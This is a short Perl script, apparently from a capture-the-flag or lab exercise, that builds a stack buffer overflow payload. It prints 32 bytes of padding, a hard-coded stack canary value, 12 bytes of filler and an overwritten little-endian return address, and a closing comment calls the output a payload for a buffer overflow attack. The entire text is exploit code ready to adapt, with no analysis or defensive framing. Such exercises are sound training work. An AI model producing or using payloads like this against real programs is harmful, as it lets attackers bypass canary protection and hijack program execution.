my $buffer = "A" x 32;
my $canary = "\x00\xd1\xa5\x31"; # 4-byte canary value
my $gap    = "B" x 12; # 12-byte gap to reach the return address
my $ret    = "\x0b\x86\x04\x08"; # 4-byte return address (to be replaced with the actual address)
# 31a5d100
print $buffer . $canary . $gap . $ret;
# The above code constructs a payload for a buffer overflow attack.